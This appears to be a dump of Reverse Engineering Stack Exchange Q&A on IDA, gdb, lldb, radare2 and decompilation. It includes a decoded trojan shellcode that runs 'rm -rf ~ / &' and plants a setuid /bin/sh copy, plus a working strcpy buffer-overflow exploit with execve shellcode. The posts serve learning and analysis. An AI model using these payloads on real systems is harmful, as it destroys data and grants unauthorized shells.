<p><a href=""https://i.stack.imgur.com/TB4B7.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/TB4B7.png"" alt=""GUI&#39;s results""></a></p>

<p>Thanks in advance.</p>
","<p>There is one function that does this: <code>build_stkvar_xrefs</code>, defined in C++ but exposed via the Python SWIG bindings. IDA builds stack xrefs dynamically when you ask for it. In order to use the function, it requires a little bit of setup.</p>

<p>You'll need to use a few functions to get what you need:</p>

<ul>
<li><code>get_func(ea)</code>: retrieves the <code>func_t</code> structure for the function at <code>ea</code></li>
<li><code>get_frame(func_t foo)</code>: returns the <code>struct_t</code> structure for the
function frame specified by <code>foo</code></li>
<li><code>DecodeInstruction(ea)</code>: returns the <code>inst_t</code> representing instruction at <code>ea</code></li>
<li><code>get_stkvar(op_t op, sval_t v)</code>: <code>op</code> is a reference to an instruction, <code>v</code> is the immediate value in the operand. Usually you just use <code>op.addr</code>. It returns a tuple, <code>(member_t, val)</code>. <code>member_t</code> is a pointer to the stack variable, which is what we need. <code>val</code> is the same value as the <code>soff</code> field in the <code>member_t</code> for the stack var. More on this later.</li>
<li><code>xreflist_t()</code>: creates a new <code>xreflist</code> of <code>xreflist_entry_t</code></li>
<li><code>build_stkvar_xrefs(xreflist_t xrefs, func_t func, member_t member)</code>: fills xrefs with <code>xreflist_entry_t</code>'s that represent the stack var xrefs given by <code>member</code> in <code>func</code>.</li>
<li><code>struct_t.get_member(x)</code>: You can use this method to iterate all stack variables in a frame to retrieve all <code>member_t</code>'s. If you want to build xrefs for all stack variables, this is usually easier.</li>
</ul>

<p>Here's an example of how this all ties together:</p>

<pre><code># 0x4012d0 is the function address
# 0x4012dc is an instruction address referencing
# a stack variable. It looks like:
# mov [ebp - 4], ecx

pFunc = get_func(0x4012d0)
pFrame = get_frame(pFunc)
inst = DecodeInstruction(0x4012dc)
op = inst[0] #first operand references stack var
pMember, val = get_stkvar(op, op.addr)
xrefs = xreflist_t()
build_stkvar_xrefs(xrefs, pFunc, pMember)
for xref in xrefs:
    print hex(xref.ea) #print xref address

# Contrived member dictionary example.
dictMem = dict()
x = 0
while(x &lt; pFrame.memqty):
    dictMem[GetMemberName(pFrame.id, pFrame.get_member(x).soff)] = pFrame.get_member(x)
    x = x+1
# given var name you can now use the
# dictionary to grab the member_t to pass
# to build_stkvar_xrefs
pMem = dictMem[""var_4""]
xrefs = xreflist_t()
build_stkvar_xrefs(xrefs, pFunc, pMem)
for xref in xrefs:
    print hex(xref.ea) #print xrefs to var_4
</code></pre>

<p><code>soff</code> isn't a stack offset. I think it means ""structure offset"", and it's an offset into the frame structure so you can retrieve other bits of information. You'll need this field to use other stack variable related functions such as: SetMemberType, SetMemberName, GetMemberName, DelStrucMember, etc. </p>

<p>So, for a simple on the fly variable name to xref lookup, you can do something like:</p>

<pre><code>def get_stack_xrefs(func_ea, var_name):
    pFunc = get_func(func_ea)
    pFrame = get_frame(pFunc)
    pMember = None
    result = []
    while(x &lt; pFrame.memqty):
        if GetMemberName(pFrame.id, pFrame.get_member(x).soff) == var_name:
           pMember = pFrame.get_member(x)
           break; 
        x = x+1
    if pMember: 
        xrefs = xreflist_t()
        build_stkvar_xrefs(xrefs, pFunc, pMember)
        for each in xrefs:
            result.append(each.ea)
    return result
</code></pre>

<p>If you want more information on these functions, I recommend taking a look at the following modules from the IDA SDK documentation (in no particular order):</p>

<ul>
<li>funcs.hpp</li>
<li>frame.hpp</li>
<li>struct.hpp</li>
</ul>

<p>Reference: <a href=""https://www.hex-rays.com/products/ida/support/sdkdoc/files.html"" rel=""noreferrer"">https://www.hex-rays.com/products/ida/support/sdkdoc/files.html</a></p>
","16095"
"Why does IDA add ""db"" statements between disassembled code","848","","<p>I'm trying to analyze a MS-DOS COM file that I wrote a few years ago with IDA Free 5.0, I've since renamed the segment to <code>code_and_data</code> and named constants and set data types correctly. However, when looking at the disassembly, I get <code>db</code> pseudo-instructions in the listing, like this:</p>

<pre>
code_and_data:0106 replacement_irq_handler:                ; DATA XREF: start+81o
code_and_data:0106                 cli
code_and_data:0107                 push    bx
code_and_data:0108                 db      3Eh
code_and_data:0108                 cmp     byte ptr ds:3BEh, 'C'
code_and_data:010E                 jnz     short call_original_dos_interrupt_handler
code_and_data:0110                 db      3Eh
code_and_data:0110                 cmp     byte ptr ds:3C0h, 'A'
code_and_data:0116                 jnz     short call_original_dos_interrupt_handler
code_and_data:0118                 db      3Eh
code_and_data:0118                 cmp     byte ptr ds:3C2h, 'K'
code_and_data:011E                 jnz     short call_original_dos_interrupt_handler
code_and_data:0120                 db      3Eh
code_and_data:0120                 cmp     byte ptr ds:3C4h, 'O'
code_and_data:0126                 jnz     short call_original_dos_interrupt_handler
code_and_data:0128                 db      3Eh
code_and_data:0128                 cmp     byte ptr ds:3C6h, 'N'
code_and_data:012E                 jnz     short call_original_dos_interrupt_handler
code_and_data:0130                 push    StartOfIndexTable
code_and_data:0133                 pop     bx
</pre>

<p>I understand that there are no additional bytes there, since the <code>db</code> and the <code>cmp</code> instruction after it start at the same address (see left column). Why does IDA show/add those <code>db</code> pseudo-instructions?</p>

<p>Is there any way to tell it to not show those, or is there a reason why it might be useful (I could only guess that since the same segment is both used for code and data, it tries to be ""helpful"" and show the code as data as well)?</p>

<p>But if so, why does it only show the first byte of the instruction (if you look at the addresses on the left again, these instructions are longer than 1 byte).</p>
","<p>The byte <code>3Eh</code> is the encoding of the segment override <code>DS:</code>. You observe it in an instruction like</p>

<pre><code>cmp     byte ptr ds:3BEh, 'C'
</code></pre>

<p>The hex encoding of this instruction is (I did this manually, some bit might be wrong)</p>

<pre><code>3E    - segement override prefix
80    - 8 bit ALU instruction
3E    - mod/rm byte (reg = 7 -&gt; instruction is CMP, mod = 0/rm = 6 -&gt; immediate address)
BE 03 - offset of data to compare
43    - immediate data byte
</code></pre>

<p>The sequence <code>3E 80 3E BE 03 53</code> is 6 bytes long, which matches the actual instruction length of 6 bytes (<code>010Eh - 0108h</code>). If you assemble the assembler source code as given by IDA using a standard x86 assembler (like <code>MASM</code>), the <code>DS:</code> prefix will be ommitted, because the addressing mode ""immediate address"" is relative to the data segment <em>by default</em>. IDA shows the extra <code>DB</code> instruction to tell you (or an assembler that tries to re-assemble the listing) that the redundant, superflous segment prefix is actually encoded in the binary. If you want to hide that information, check Options -> General -> Analysis -> ""Processor specific analysis options"" -> ""Don't display redundant instruction prefixes"".</p>
","16180"
"Reversing an MFC application: How to find class memory layouts?","846","","<p>I have an old computer game I want to reverse (Windows 95 ""Hover!"" to be exact), and I figured out that it uses the MFC.</p>

<p>HexRays often decompiles pseudocode like this, which, for example, deals with an MFC class <a href=""https://msdn.microsoft.com/en-us/library/48xz4yz9.aspx"" rel=""nofollow noreferrer""><code>CWinThread</code></a>:
<a href=""https://i.stack.imgur.com/iRS4F.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/iRS4F.png"" alt=""IDA MFC code pseudocode""></a></p>

<p>As you can see, the variable <code>this</code> is the <code>CWinThread</code> instance, but the layout of it seems undefined, it accesses its members through offsets.</p>

<p>I want / need to find out which members are at which offsets.</p>

<p>Even while easy to guess in the marked example (+48 seems to be the peeked message), there's another member slightly more below at offset +60 about which I have no clue. I searched the MSDN documentation and looked into the header file to find a layout of the class, but couldn't find anything that helped me.</p>

<p>Where would I retrieve such member / memory layout information about MFC classes?</p>
","<p>You might have a look <a href=""http://fossies.org/windows/misc/winscp577source.zip/libs/mfc/source/thrdcore.cpp"" rel=""nofollow"">here</a>, line# 456ff.</p>

<p>The method you are looking for seems to be the OnIdle function.</p>
","12392"
"gdb on FreeBSD and follow-fork-mode child","844","","<p>Long time ago I noticed that using</p>

<blockquote>
  <p>set follow-fork-mode child </p>
</blockquote>

<p>in GDB on FreeBSD doesn't really work. 
This problem occurs very often with some challenges on various Capture The Flag contests.
For example, a server will spawn a child which would handle the connection.
The child code has a vulnerability which I would like to debug, but gdb just never follows 
the childs execution and I can't really observe the vulnerability being triggered.</p>

<p>So far, I've solved this problem in two ways:</p>

<ol>
<li><p>Making a connection, waiting for a child to spawn and than attaching GDB to it.</p>

<p>This works since the spawned child has it's own PID to which I can attach, but is rather painful since first I have to make a connection from one session, attach with GDB in another, and then send the payload/continue the connection in the first. </p></li>
<li><p>Patching the binary after the fork call to continue the execution in the parent process instead of the child. </p>

<p>This is also painful since then I have to restart the whole parent process to create another debugging session.</p></li>
</ol>

<p>There are some other tricks that can be employed, but these are enough to illustrate my point. </p>

<p>Now I know there have been some limitations on FreeBSD in the past regarding this but has anything improved? </p>

<p>Is there any way to patch GDB to add this functionality? Any suggestions for an easier way of overcoming this?</p>
","<p>Try to set a catchpoint on fork if you are want to both the parent and the child.</p>

<pre><code>set-follow-fork-mode ask 
catch fork 
</code></pre>

<p>Concerning your second point, I have this macro in my <code>.gdbinit</code> (I believe ultimately originating from Tavis Ormandy). It is imminently useful in many cases, your own included.</p>

<pre><code>define assemble
 # dont enter routine again if user hits enter
 dont-repeat
 if ($argc)
  if (*$arg0 = *$arg0)
    # check if we have a valid address by dereferencing it,
    # if we havnt, this will cause the routine to exit.
  end
  printf ""Instructions will be written to %#x.\n"", $arg0
 else
  printf ""Instructions will be written to stdout.\n""
 end
 printf ""Type instructions, one per line.\n""
 printf ""End with a line saying just \""end\"".\n""
 if ($argc)
  # argument specified, assemble instructions into memory
  # at address specified.
  shell nasm -f bin -o /dev/stdout /dev/stdin \
    &lt;&lt;&lt; ""$( echo ""BITS 32""; while read -ep '&gt;' r &amp;&amp; test ""$r"" != end; \
                do echo -E ""$r""; done )"" | hexdump -ve \
        '1/1 ""set *((unsigned char *) $arg0 + %#2_ax) = %#02x\n""' \
            &gt; ~/.gdbassemble
  # load the file containing set instructions
  source ~/.gdbassemble
  # all done.
  shell rm -f ~/.gdbassemble
 else
  # no argument, assemble instructions to stdout
  shell nasm -f bin -o /dev/stdout /dev/stdin \
    &lt;&lt;&lt; ""$( echo ""BITS 32""; while read -ep '&gt;' r &amp;&amp; test ""$r"" != end; \
                do echo -E ""$r""; done )"" | ndisasm -i -b32 /dev/stdin
 end
end
document assemble
Assemble instructions using nasm.
Type a line containing ""end"" to indicate the end.
If an address is specified, insert instructions at that address.
If no address is specified, assembled instructions are printed to stdout.
Use the pseudo instruction ""org ADDR"" to set the base address.
end
</code></pre>
","2257"
"lldb: break at start of actual code, not entrypoint","843","","<p>I want lldb to break at the start of the actual code of an OS X application (which might be called <em>main</em> if symbols are existing). </p>

<p>I am currently looking this up by hand, but as I want to script some actions, it would be great if this could somehow be realized automatically</p>

<p><img src=""https://i.stack.imgur.com/8fUYr.png"" alt=""enter image description here""></p>

<p>Do you have any idea if there is a way?</p>
","<p>Try this:</p>

<pre><code>(lldb) break set -n main
(lldb) r
(lldb) thread backtrace

frame #0: 0x0000000000405696 app`main(argc=1, argv=...) + 22 at app.cpp:11
frame #1: 0x00007ffff7216ec5 libc.so.6`__libc_start_main + 245
frame #2: 0x0000000000401f79 app
</code></pre>

<p>The frame below (before) main is the one you want, and it's showing the library and function name.  You can set a breakpoint on it just like any other:</p>

<pre><code>(lldb) break set -n __libc_start_main
Breakpoint 1: where = libc.so.6`__libc_start_main, address = 0x00007ffff7216dd0
</code></pre>

<p>or, to be more specific:</p>

<pre><code>(lldb) break set -s libc.so.6 -n __libc_start_main
Breakpoint 2: where = libc.so.6`__libc_start_main, address = 0x00007ffff7216dd0
</code></pre>

<p>If you know the address, you could use it directly:</p>

<pre><code>(lldb) break set -a 0x000000...
</code></pre>

<p>Then restart the process, and you should hit it immediately:</p>

<pre><code>(lldb) r
There is a running process, kill it and restart?: [Y/n] y
...
* thread #1: ...__libc_start_main, name = 'app', stop reason = breakpoint
frame #0: 0x00007ffff7216dd0 libc.so.6`__libc_start_main
-&gt; ...: pushq  %r14
(lldb)
</code></pre>
","10801"
"Radare2 find xrefs to a function in the import table","842","","<p>What is the Radare2 equivalent of going to the import table in ida, hitting enter on a function and then pressing ctrl+x?</p>

<p>When I use axt, it can only find xrefs to strings.</p>
","<p>After some researching. </p>

<p>I ran aaa and now you can use axt @ sym.imp.[dll].[function]</p>
","12209"
"How does this version of `rm -rf /` work?","836","","<p>On <a href=""https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List#destroy"" rel=""nofollow"">this website</a>, I found the following code:</p>

<pre><code>char esp[] __attribute__ ((section(”.text”))) /* e.s.p release */ = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68\""
“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99\""
“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7\""
“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56""
“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31""
“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69""
“\x6e\x2f\x73\x68\x00\x2d\x63\x00""
“cp -p /bin/sh /tmp/.beyond; chmod 4755 /tmp/.beyond;”;
</code></pre>

<p>I replaced the <code>“</code> character with <code>""</code>, removed trailing <code>\</code> and put decoded it into a file. Here's what it disassembles to:</p>

<pre><code>00000000  EB3E              jmp short 0x40
00000002  5B                pop ebx
00000003  31C0              xor eax,eax
00000005  50                push eax
00000006  54                push esp
00000007  5A                pop edx
00000008  83EC64            sub esp,byte +0x64
0000000B  68FFFFFFFF        push dword 0xffffffff
00000010  68DFD0DFD9        push dword 0xd9dfd0df
00000015  688D99DF81        push dword 0x81df998d
0000001A  688D92DFD2        push dword 0xd2df928d
0000001F  54                push esp
00000020  5E                pop esi
00000021  F716              not dword [esi]
00000023  F75604            not dword [esi+0x4]
00000026  F75608            not dword [esi+0x8]
00000029  F7560C            not dword [esi+0xc]
0000002C  83C474            add esp,byte +0x74
0000002F  56                push esi
00000030  8D7308            lea esi,[ebx+0x8]
00000033  56                push esi
00000034  53                push ebx
00000035  54                push esp
00000036  59                pop ecx
00000037  B00B              mov al,0xb
00000039  CD80              int 0x80
0000003B  31C0              xor eax,eax
0000003D  40                inc eax
0000003E  EBF9              jmp short 0x39
00000040  E8BDFFFFFF        call dword 0x2
00000045  2F                das
00000046  62696E            bound ebp,[ecx+0x6e]
00000049  2F                das
0000004A  7368              jnc 0xb4
0000004C  00                db 0x00
0000004D  2D                db 0x2d
0000004E  6300              arpl [eax],ax
</code></pre>

<p>And here's a hexdump:</p>

<pre><code>[17:20:46][~]$ hexdump -C /tmp/b
00000000  eb 3e 5b 31 c0 50 54 5a  83 ec 64 68 ff ff ff ff  |.&gt;[1.PTZ..dh....|
00000010  68 df d0 df d9 68 8d 99  df 81 68 8d 92 df d2 54  |h....h....h....T|
00000020  5e f7 16 f7 56 04 f7 56  08 f7 56 0c 83 c4 74 56  |^...V..V..V...tV|
00000030  8d 73 08 56 53 54 59 b0  0b cd 80 31 c0 40 eb f9  |.s.VSTY....1.@..|
00000040  e8 bd ff ff ff 2f 62 69  6e 2f 73 68 00 2d 63 00  |...../bin/sh.-c.|
00000050
</code></pre>

<p>What is it really? I can see <code>/bin/sh</code> and a call to <code>execve</code> so I guess it's some kind of shellcode, but I don't understand how it's run in this example (the <code>char esp[] __attribute__ ((section(”.text”)))</code> part).</p>
","<p>It's not run in the example. It's a shellcode, it has to be somehow injected (for example using a buffer overflow vulnerability).
To understand how it works, let's first put some addresses on the strings:</p>

<pre><code>00000045  ""/bin/sh""
0000004D  ""-c""
0000004F  ""cp -p /bin/sh /tmp/.beyond; chmod 4755 /tmp/.beyond;""
</code></pre>

<p>Let's look at the disassembly piece by piece.</p>

<pre><code>00000000  EB3E              jmp short 0x40
00000002  5B                pop ebx        ; 1st argument for execve(): filename = ""/bin/sh""
00000003  31C0              xor eax,eax    ; eax = 0
00000005  50                push eax       ; envp[0] = NULL, argv[3] = NULL
00000006  54                push esp
00000007  5A                pop edx        ; 3rd argument for execve(): envp = {NULL}
...
00000040  E8BDFFFFFF        call dword 0x2
00000045  ""/bin/sh""
...
</code></pre>

<p>The jmp/call is a well known trick: the call will push the address of the following instruction to the stack. This gets popped into ebx, which now contains the address to ""/bin/sh"". In a system call, ebx is the first argument.
Next, eax is zeroed using a xor instruction and pushed to the stack. The pointer to those four zero bytes is stored in esp, which ends up in edx (3rd argument). The envp parameter of execve() is terminated with a null pointer: no environment vars in this case. This will also be used in argv.</p>

<pre><code>00000008  83EC64            sub esp,byte +0x64    ; Reserve 0x64 bytes on the stack
0000000B  68FFFFFFFF        push dword 0xffffffff ; Push 4th string word
00000010  68DFD0DFD9        push dword 0xd9dfd0df ; Push 3rd string word
00000015  688D99DF81        push dword 0x81df998d ; Push 2nd string word
0000001A  688D92DFD2        push dword 0xd2df928d ; Push 1st string word
0000001F  54                push esp
00000020  5E                pop esi             ; esi = esp
00000021  F716              not dword [esi]     ; Not 1st string word: 0x2d206d72 'rm -'
00000023  F75604            not dword [esi+0x4] ; Not 2nd string word: 0x7e206672 'rf ~'
00000026  F75608            not dword [esi+0x8] ; Not 3rd string word: 0x26202f20 ' / &amp;'
00000029  F7560C            not dword [esi+0xc] ; Not 4th string word: 0x00000000 (NULL terminator)
0000002C  83C474            add esp,byte +0x74  ; Restore esp
</code></pre>

<p>""rm -rf ~ / &amp;"" is pushed NOT-encoded into the stack and decoded in place. esi points to the decoded string.</p>

<pre><code>0000002F  56                push esi            ; argv[2] = ""rm -rf ~ / &amp;""
00000030  8D7308            lea esi,[ebx+0x8]   ; esi = address of ""-c""
00000033  56                push esi            ; argv[1] = ""-c""
00000034  53                push ebx            ; argv[0] = ""bin/sh""
00000035  54                push esp
00000036  59                pop ecx    ; ecx = 2nd argument for execve(): argv = {""/bin/sh"", ""-c"", ""rm -rf ~ / &amp;"", NULL}
00000037  B00B              mov al,0xb ; 11 = execve() system call
00000039  CD80              int 0x80   ; execve()
</code></pre>

<p>It's time to build the argv array and make the call. The previous piece of code restored esp, so whatever is pushed will be after that first 0x00000000. Piece by piece the arguments are pushed to the stack. Remember that ebx held the pointer to ""/bin/sh"" (7 chars + terminator), so ebx+8 will be ""-c"". The null word that was pushed into the stack at the very beginning of the shellcode is reused as the terminator for argv.</p>

<pre><code>0000003B  31C0              xor eax,eax
0000003D  40                inc eax        ; 1 = exit() system call
0000003E  EBF9              jmp short 0x39 ; exit()
</code></pre>

<p>Using xor+inc eax is set to 1, which is system call exit(). It then jumps to the int 0x80 instruction and exit() is called.</p>
","8863"
"Why IDA Pro will generate this kind of code(mess up macro name and variable name)?","834","","<p>I use IDA Pro 6.1 to disassembly ELF file,
which is compiled on 32 bit Linux, gcc 4.6.3</p>

<p>I modified the code and try to make it reassemble, 
and I find a problem here(this is directly created by IDA Pro):</p>

<pre><code>main    proc near
......
mov     dword ptr [esp+4], offset msgid
......
......
foo     proc near
msgid   =  dword ptr -18d
......
mov     [esp+1Ch+msgid], 1

section .rodata
msgid           db 'extra operand %s',0
</code></pre>

<p>So if I do some modify work and assembly it use <strong>nasm</strong>, it will produce this error:</p>

<pre><code>error: label or instruction expected at start of line 
</code></pre>

<p>targeting on this line:</p>

<pre><code>msgid           db 'extra operand %s',0
</code></pre>

<p>If I modify it like this:</p>

<pre><code>main    proc near
......
mov     dword ptr [esp+4], offset msgid111
......
......
foo     proc near
msgid   =  dword ptr -18d
......
mov     [esp+1Ch+msgid], 1

section .rodata
msgid111           db 'extra operand %s',0
</code></pre>

<p>Then no error in this part.</p>

<p>So my questions are:</p>

<ol>
<li>Why IDA Pro will use variable name as the macro name?</li>
<li>Is there any better way to bypass this error than modify the variable name?</li>
</ol>

<p>Thank you!</p>
","<ol>
<li><p>IDA will use this variable name if you renamed it somehow.
This variable name is local for the function because it is a stack offset. </p></li>
<li><p>There is no better way than name modification.
You can solve this specific kind of error by writing script that renames anything in <code>.rodata</code> section by applying <code>g_</code> prefix to any object in it.</p></li>
</ol>

<p>The code will look like this:</p>

<pre><code>#Use carefully, I didn't check this code
#beware errors

import idautils
import idc

prefixes = {"".rodata"": ""g_ro_"",
            "".data"": ""g_""}

#Passing over all non default names
for (ea, name) in idautils.Names():
    seg_name = idc.SegName(ea)
    # if the name is in required segment
    if seg_name in prefixes:
        if not name.startswith(prefixes[seg_name]):
            # renaming it by adding required prefix
            # if the prefix is not added yet
            name = prefixes[seg_name] + name
            idc.MakeName(ea, name)
</code></pre>
","3602"
"Hex-Rays decompiler stuck on function","833","","<p>I'm working on a Linux x86_64 ELF binary using IDA 6.6.</p>

<p>When I run the Hex-Rays Decompiler on a function (by pressing F5) it always shows me the pseudocode for the <code>_init_proc</code> function, no matter what I run it on. It's stuck on that function and won't show me anything else in the pseudocode view. No errors are displayed or printed to the log.</p>

<p>If I produce the C file (Ctrl+F5) the full pseudocode is generated, so it's just an interface issue.</p>

<p>This is driving me mad. Things I've tried:</p>

<ul>
<li>Restarting IDA</li>
<li>Recreating the database</li>
<li>Deleting all decompiler information for <code>_init_proc</code></li>
<li>Deleting all decompiler information for the function I'm trying to decompile</li>
</ul>

<p>Has anyone encountered this behaviour before? Any suggestions?</p>
","<h1>Reset IDA configuration</h1>

<p>I eventually solved this issue by completely erasing IDA's configuration. I'm on Windows, so I removed the <code>HKCU\Software\Hex-Rays</code> key. On Linux you should probably try removing <code>~/.idapro/ida.reg</code>.</p>
","10676"
"identification/reverse engineer lz compression","832","","<p>I am doing a translation project for the PSP version of a game released by Prototype (Japanese company), but I am having trouble with some GIM files (image files). 
Now the actual problem is not with the gim format, but a compression that has been placed on the gim files, but before that I will clarify a few things.
Some of the GIM's work, however sometimes a GIM file appears that neither puyotools or GimConv (software that converts gim to png) can handle. The GIM that doesn't work is a little different in appearance.
I know its a GIM file because it starts with: MIG.00.1PSP, though to be exact, its a little different and written like this:</p>

<p><code>[integer equals 16, signature?] [integer equals 131792] [MIG.00.1PSP, but where a 00 HEX is placed between each hex byte]
</code></p>

<p>like this:</p>

<p><code>10 00 00 00 D0 02 02 00 4D 00 49 00 47 00 2E 00 30 00 30 00
2E 00 31 00 50 00 53 00 50 00 00 00</code></p>

<p>Each of the compressed GIM files starts with these two integers values (however an image I have with smaller resolution has a different second integer). I have allready tried removing these two integers and also tried replacing M(00)I(00)G(00).(00)0(00)0(00).(00)1(00)P(00)S(00)P(00), with simply MIG.00.1PSP, but that just ended up making GIMConv saying: wrong chunk data.</p>

<p>Also I have tried analyzing the file with signsrch and TrID to look for hints of some sort, but signsrch finds nothing and TrID only finds: ""100 .0% (.) LTAC compressed audio (v1.61) (1001/2)""</p>

<p>Here is the file called: black.gim (a black image)
<img src=""https://i.stack.imgur.com/Quc5S.png"" alt=""enter image description here""></p>

<p>Here is a random CG: 
<img src=""https://i.stack.imgur.com/W1UrT.png"" alt=""enter image description here""></p>

<p>Here is a random gim file for refference to how an uncompressed version should look like. Notice that the first 4 bytes of the second line indicates the file size minus 16. 
Another thing is the int after MIG.001.PSP, which I from different sources has found to be the version number. Therefore, all the compressed files should problably get that int there too.
<img src=""https://i.stack.imgur.com/pTza1.png"" alt=""enter image description here"">
Update: I believe this is some kind of lz compression, but I haven't figured out which one yet. Tried lz01,lz00,lz10,lz11,CXLZ, lzss . It seems to me that it begins with a 10 byte like lz, it makes MIG.001.PSP become seperated by 00, due to the compression relying on value, key pair, where I believe the key 0 means that values should be directly send to the output. &lt;- if you are confident that its one of the compressions I have tried, please say so too as it could very well just be the tools I used to try those compressions that was wrong with. GZIP and deflate was tried using .NET's System.IO.Compression in C# and the others has been tried using something called Puyo tools.</p>

<p>Update: It seams like I have it almost figured out, basicly a key equals zero outputs value to decompressed data. If key is higher than zero, then get the short value of [Value,key-1]. This short plus 8 times two gives the byte it has to write out twice to decompressed data. In other words, 00 00 08 01 would output 00 00 00. The only problem with this is that 0f 01 in my black.gim example at line 3. This would point to 15 which would be position (15 + 8)*2 equals byte 46 which should be 02 00 in line two. This is however incorrect! Since I expect it to place zeroes there, not output 02 02..</p>

<p>In short in the black.gim example I have found that:
0C 01 should output 00 00
0D 01 should output 00 00 00
0F 01 should output 00 00</p>

<p>Any suggestions?</p>

<p>I'll be really happy if anybody could give me some input or lead :)</p>
","<p>Here is the complete answer to everyone who may encounter compressed GIM file of simular compression.
Basicly the file starts like this:
[magic number 10 00 00 00] [Integer with uncompressed size of file]
After this the compressed file begin.
The compression basicly functions like this: (in terms of decompression)</p>

<p><strong>-> Take the next 2 bytes.</strong></p>

<p><strong>-> Is the second byte equals zero?</strong></p>

<ul>
<li>Write first byte to decompressed output.</li>
</ul>

<p><strong>-> Is the second byte higher than 0?</strong></p>

<p>This is a pointer whose job is to make use of bytes used before. The position it points to is equals the unsigned short value of: [first byte, second byte minus 1]*2 + 8. When a pointer reads at the position it points to, it will read the next 4 bytes and not just the next 2 bytes. If the bytes at the pointed location is: 00 02 0C 01, then the decompressed output would be 02 ?? where ?? would be the result of the first two bytes of what its pointing at. In other words, if we pointed to 0C 01 02 00, then the output 0C 01 would be replaced by the result whatever its pointing to.Lets say it points to 08 00 00 00, then the output of the last pointer would be 08 00 00 00, which would replace 0C 01 and become: 08 00 00 00 02 00, which lastly would output 08 00 02 to decompressed output. *Notice that a pointer placed as the second byte cannot be replaced by four bytes, but only by the first two bytes of what would normally have been the result. If the second byte is pointing to the first byte, then it will simply be given the result of the first byte.</p>

<p>Examples from the image from the first post (Black.gim):
In the first image: 0c 01 points to 00 00 0C 01, which outputs 00 00.
In the first image 0d 01 points to 0C 01 0C 01, which outputs 00 00 00. &lt;- notice how only the first two bytes at a pointed position has the right to extend the result of what pointed to it by two bytes.
In the first image: 0F 01 points to 02 00 0D 01, which outputs 02 00</p>

<p><strong>-> do this until no bytes remains..</strong></p>

<p>About the suggested LZJB, I'll check right away. In case its right, I have still gotten quite the experience about reverse engineering files.</p>
","3765"
"Beginner buffer overflow - why isn't my shellcode executing?","831","","<p>I'm following the video here: <a href=""https://www.youtube.com/watch?v=N0DBu3TGejI"" rel=""nofollow noreferrer"">https://www.youtube.com/watch?v=N0DBu3TGejI</a></p>

<p>ExploitMe.c</p>

<pre><code>#include&lt;stdio.h&gt;
#include&lt;string.h&gt;

main(int argc, char **argv)
{
        char buffer[80];

        strcpy(buffer, argv[1]);

        return 1;
}
</code></pre>

<p>HackYou.c</p>

<pre><code>#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;string.h&gt;

// shellcode ripped from http://www.milw0rm.com/shellcode/444

char shellcode[]=
""\x31\xc0""                      // xorl         %eax,%eax
""\x50""                          // pushl        %eax
""\x68\x6e\x2f\x73\x68""          // pushl        $0x68732f6e
""\x68\x2f\x2f\x62\x69""          // pushl        $0x69622f2f
""\x89\xe3""                      // movl         %esp,%ebx
""\x99""                          // cltd
""\x52""                          // pushl        %edx
""\x53""                          // pushl        %ebx
""\x89\xe1""                      // movl         %esp,%ecx
""\xb0\x0b""                      // movb         $0xb,%al
""\xcd\x80""                      // int          $0x80
;

char retaddr[] = ""\x08\xf3\xff\xbf"";

#define NOP 0x90


main()
{
        char buffer[96];

        memset(buffer, NOP, 96);

        memcpy(buffer, ""EGG="", 4);

        memcpy(buffer+4, shellcode, 24);

        memcpy(buffer+88, retaddr, 4);
        memcpy(buffer+92, ""\x00\x00\x00\x00"", 4);

        putenv(buffer);

        system(""/bin/sh"");

        return 0;

}
</code></pre>

<p>I run ./HackYou, in that environment there is an enviroment variable named $EGG that is used as an argument to the ExploitMe.c. $EGG contains: 24 bytes shell code, 60 bytes nop, and 4 bytes to override the RET address for a total of 88 bytes (Buffer + EBP + RET)</p>

<p>This screenshot contains the information you need to know:</p>

<p><img src=""https://i.stack.imgur.com/nGGCm.png"" alt=""enter image description here""></p>

<p>On ExploitMe.c, I break on line 8. The first thing I print is the stack. 0x00881d36 is the RET address.  </p>

<p>Then I print argv<a href=""https://i.stack.imgur.com/nGGCm.png"" rel=""nofollow noreferrer"">1</a>, as you can see it is 22 words. It will overwrite the Buffer+EBP+RET exactly. The start of the buffer variable is at 0xbffff308 (ESP+8), so I add that into the end of the payload. </p>

<p>Then I step. The RET has been perfectly overwritten with the buffer memory address.</p>

<p>It should return to the beginning of the buffer and start executing my shell code. All seems fine to me, but instead of giving me a shell, it gives me a segmentation fault. </p>

<p>What's going on? </p>

<p>Thank you.</p>
","<p>When compiling I did not disable the stack smashing protection. Compiling with -z execstack fixed this. </p>
","9179"
"How do you optimise AST's or convert them to a real language","831","","<p>I have been interested in automatic vulnerability assessment and decompilation of code for a while now. And as a result I have been building parsers in Python that reads a bin, disassembles it instruction by instruction while tracing the execution (the way IDA does it).</p>

<p>I have been tracing the polluted registers (polluted as in user input) to check when such registers allow us to setup a call or a jump. </p>

<p>This research has grown to the point, where I want to transform it to a decompiler. I had a look at boomerang and other open source decompilers. I have also had a quick peek inside the dragon book (I don't own it). I would like to hear what you guys think about this idea. Below is my outline:</p>

<ol>
<li>Open the binary file to decompile.</li>
<li>Detect a filetype (PE or ELF) to select the EP and memory layout.</li>
<li>Jump to the EP and follow execution path of the code while disassembling. 
I use udis86 for it. This execution is in a libemu kind of way.</li>
<li>Parse the resulting assembly an middle language. To get
simpler instructions, (e.g. always remove things like <code>SHL EAX, 0x02</code> and
change those things to <code>MUL</code> instructions). </li>
<li>Parse it into a Abstract Syntax Tree. </li>
<li>Optimize the AST (although, I have no idea how). </li>
<li>Transform the AST to something that looks like C.</li>
</ol>

<p>I am having issues with the last 2 steps. How does someone parse AST to a real language or something that looks like it? How do you optimize ASTs? Are there build C or Python libraries to accomplish it?</p>
","<p>The classic work on the decompilation is Cristina Cifuentes' PhD thesis <a href=""http://zyloid.com/recomposer/files/decompilation_thesis.pdf"">""Reverse Compilation Techniques""</a>. She describes generation of C code in Chapter 7.</p>

